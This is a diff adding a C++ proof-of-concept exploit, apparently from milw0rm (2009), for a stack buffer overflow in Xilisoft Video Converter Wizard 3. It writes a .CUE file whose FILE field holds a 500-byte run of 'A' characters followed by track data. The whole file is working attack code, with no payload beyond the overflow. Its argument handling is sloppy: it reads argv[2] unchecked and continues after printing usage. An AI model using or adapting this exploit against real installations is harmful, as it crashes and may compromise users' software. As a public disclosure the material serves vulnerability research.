@@ -1,0 +1,139 @@
+/*
+----------------------------------------------------------------------------------------
+Xilisoft Video Converter Wizard 3 .CUE File Stack Buffer Overflow POC
+
+name: xilisoft.cpp
+
+Credits : fl0 fl0w
+----------------------------------------------------------------------------------------
+ScreanShot in the debugger
+
+Link: http://www.downloadatoz.com/xilisoft-video-converter/wizard.html
+
+http://img23.imageshack.us/my.php?image=xilisoftvideoconverter.jpg
+----------------------------------------------------------------------------------------
+*/
+
+//Start
+
+#include <stdio.h>
+#include <string.h>
+#include <stdio.h>
+#include <assert.h>
+#include <windows.h>
+
+#define     SIZE 100000
+
+#define     FILE_FF " BINARY.. TRACK 01 MODE2/2352.. INDEX 01 00:00:00.."  
+
+class EXPLOIT {
+	public:
+	
+int check (char *, char *);
+void Usage (char *);
+ };
+ 
+static int  Poz = 1;
+static int  Neg = 0;
+  
+int i;      
+
+char Name [SIZE];    
+char NeWbuff [SIZE];
+                                            
+
+                                                  int main (int argc, char *argv [])                                                                                           
+
+ { 
+         
+        EXPLOIT VIDEO;
+        
+             
+             if ( argc < 2) 
+             
+                VIDEO.Usage ( argv [0]); 
+       
+                                                  if ( VIDEO.check ( argv [1], "-file") == Neg) { 
+                                                   
+                                                       fprintf ( stdout , " Incorect input "); 
+                                                       
+                                                       printf ( " \t..Usage is %s -file filename.. \n", Name);
+                                                                                                                              
+                                                               exit ( 0);
+                                                            
+                                                            }
+                                               
+                                                                                 
+        
+        
+          do {
+        
+            NeWbuff [i] = 'A';
+         
+            i++;
+               
+            }while (i < 500);
+               
+       
+        
+        FILE *f;
+        
+        strcpy (Name, argv [2]);
+        
+        strcat (Name, " .cue ");
+        
+        f = fopen (Name, "w");
+        
+        assert ( f != NULL);
+        
+        
+        
+        
+        strncpy ( NeWbuff + 500 , FILE_FF , strlen ( FILE_FF)); 
+                                                                 
+          
+        
+        fputs("FILE \"", f);
+        
+        fprintf ( f, " %s ", NeWbuff);
+               
+                
+        fprintf ( stdout , "File build ! ");
+         
+        exit ( 0);  
+         
+       getchar ();
+       
+                                                   return 0;        
+                                                  }
+                                                                                                    
+
+                                                         
+  
+                                                  int EXPLOIT::check (char *Arg_, char *_Arg)
+   
+   {
+        
+       if ( strcmp ( Arg_, _Arg) == 0)
+       
+        return Poz;
+        
+      return Neg;
+        
+        }   
+        
+    void EXPLOIT::Usage (char *Name)
+    
+   {
+     system ("cls");    
+     fprintf ( stdout , " \n..Xilisoft Video Converter Wizard 3 .CUE File Stack Buffer Overflow POC..\n ");
+     printf ( " \t..Usage is %s -file filename.. \n", Name);    
+     fprintf ( stdout , "..All Credits fl0 fl0w.. \n");
+     
+     
+         }   
+         
+        
+//EOF           
+
+// milw0rm.com [2009-04-10]
